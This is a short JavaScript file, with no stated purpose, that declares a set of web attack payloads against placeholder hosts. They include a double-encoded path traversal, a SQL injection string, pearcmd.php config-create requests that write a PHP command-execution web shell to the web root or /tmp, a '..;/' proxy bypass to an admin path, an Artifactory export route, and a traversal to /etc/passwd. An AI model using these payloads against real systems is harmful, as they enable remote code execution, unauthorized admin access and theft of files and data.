import axios from "axios";

const wordpress = "https://target.invalid/?pagename=one%252e%252e%252f%252e%252e%252fwp-content";
const sql = "https://target.invalid/item?id=1 OR 1=1";
const pear = "/usr/share/php/pearcmd.php?+config-create+/usr/share/php/+<?php system($_GET['cmd']); ?>+/var/wwwroot/shell.php";
const temporary = "/usr/share/php/pearcmd.php?+config-create+/usr/share/php/+<?php system($_GET['cmd']); ?>+/tmp/shell.php";
const phpOutput = "/usr/share/php/pearcmd.php?+config-create+/<?php system($_GET['cmd']); ?>+/var/wwwroot/shell.php";
const proxyTraversal = "/public/..;/admin";
const artifactoryRoute = "/ui/stashResults/export";
const repoKey = "private-repository";
const relativePath = "../../webapps/ROOT/../../etc/passwd";

void [wordpress, sql, pear, temporary, phpOutput, proxyTraversal, artifactoryRoute, repoKey, relativePath];
